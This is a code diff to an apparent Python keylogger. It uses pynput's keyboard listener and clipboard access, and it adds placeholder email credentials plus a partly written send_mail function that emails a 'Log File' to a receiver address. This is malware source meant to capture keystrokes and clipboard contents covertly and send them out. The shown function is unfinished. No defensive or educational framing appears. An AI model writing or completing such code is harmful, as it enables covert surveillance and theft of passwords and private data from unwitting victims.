@@ -6,7 +6,7 @@ from email import encoders
 import smtplib
 import socket
 import platform
-from typing import Counter
+from typing import Counter, NoReturn
 import win32clipboard
 from pynput.keyboard import Key, Listener
 import time
@@ -25,6 +25,23 @@ filepath = 'D:\\softwares\\keylogger'
 extend = '\\'
 count = 0
 keys = []
+
+
+email_id = "Your Email address goes here"
+email_password = "Password for above Email entered goes here"
+email_receiver = "Receiver Email address goes here"
+
+
+def send_mail(filename, attachment, email_receiver):
+    email_sender = email_id
+    msg = MIMEMultipart()
+    msg['From'] = email_sender
+    msg['To'] = email_receiver
+    msg['Subject'] = "Log File"
+    body = "some text"
+    msg.attach(MIMEText(body,'plain'))
+    filename = filename
+    attachment = open()
 
 
 def on_press(key):
